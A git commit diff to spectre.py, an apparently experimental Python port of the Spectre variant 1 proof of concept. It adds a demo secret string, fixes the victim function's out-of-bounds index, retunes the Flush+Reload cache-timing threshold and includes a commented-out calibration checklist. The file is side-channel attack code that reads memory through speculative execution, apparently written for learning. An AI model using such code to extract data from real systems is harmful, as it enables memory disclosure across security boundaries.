ef31cc5d655eae70cc1d8b553f812b13d7e7cc91
Joachim Nyborg <joachim.c.nyborg@gmail.com>
2018-05-19 11:26:52 +0200

    Updated threshold

--- spectre.py
+++ spectre.py
@@ -5,22 +5,23 @@ array1 = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]
 array2 = [None]*256*512
 temp = 0
 
+secret = "The Magic Words are Squeamish Ossifrage.";
+
 def victim_function(x):
     if (x < array1_size):
-        temp = array2[array1[1] * 512]
+        temp = array2[array1[x] * 512]
 
 
 
 # Flush+Reload
-CACHE_HIT_THRESHOLD = 80
+CACHE_HIT_THRESHOLD = 5e-06
 CACHE_SIZE = 12 * 1024 * 1024
 eviction_buffer = [42]*CACHE_SIZE
 
 def clflush(size, offset=64):
-    temp = 0
-    # Fill our CPU cache
+    # Fill our CPU cache by reading 12 mb data
     for i in range(0, size, offset):
-        temp = eviction_buffer[i]
+        eviction_buffer[i]
         
 
 
@@ -32,6 +33,7 @@ def read_memory_byte(malicious_x):
         clflush(CACHE_SIZE)
 
         for j in range(33):
+            clflush(CACHE_SIZE)
             for z in range(100):
                 pass # delay
             # if j % 4 training_x else malicious_x
@@ -46,6 +48,7 @@ def read_memory_byte(malicious_x):
             junk = array2[mix_i * 512]
             time2 = time.time() - time1
             if (time2 <= CACHE_HIT_THRESHOLD):
+                print("Cache hit!")
                 results[mix_i] += 1
 
         j = k = -1
@@ -71,10 +74,47 @@ def read_memory_byte(malicious_x):
 
 
 if __name__ == "__main__":
-    malicious_x = 42
-    l= 40
+    # Checklist: 
+    # - clflush: Works
+    # - set threshold
+    # - Victim function, does it speculative execute?
+    # hit_s = 0
+    # miss_s = 0
+    # fp = 0
+    # for i in range(1000):
+    #     # cache hit
+    #     junk = array1_size
+    #     time1 = time.time()
+    #     junk = array1_size
+    #     time2 = time.time() - time1
+    #     if time2 <= CACHE_HIT_THRESHOLD:
+    #         print("Correct")
+    #     else:
+    #         print("Wrong threshold time2", time2)
 
-    for _ in range(l, 0, -1):
+    #     # cache miss
+    #     clflush(CACHE_SIZE)
+    #     time1 = time.time()
+    #     junk = array1_size
+    #     time3 = time.time() - time1
+    #     if time3 <= CACHE_HIT_THRESHOLD:
+    #         print("Wrong threshold time3", time3)
+    #         fp += 1
+    #     else:
+    #         print("Correct")
+
+    #     hit_s += time2
+    #     miss_s += time3
+            
+    # # set threshold as avg for hit
+    # print("avg time for hit", hit_s/100.0)
+    # print("avg time for miss", miss_s/100.0)
+    # print("false positives", fp)
+
+    malicious_x = 0
+    length = 1000
+
+    for _ in range(length, 0, -1):
         value, score = read_memory_byte(malicious_x)
         print("Success" if score[0] >= 2*score[1] else "Unclear")
         print(value[0], (chr(value[0]) if value[0] > 31 and value[0] < 127 else '?'), score[0])
@@ -84,4 +124,3 @@ if __name__ == "__main__":
 
 
 
-clflush(CACHE_SIZE)
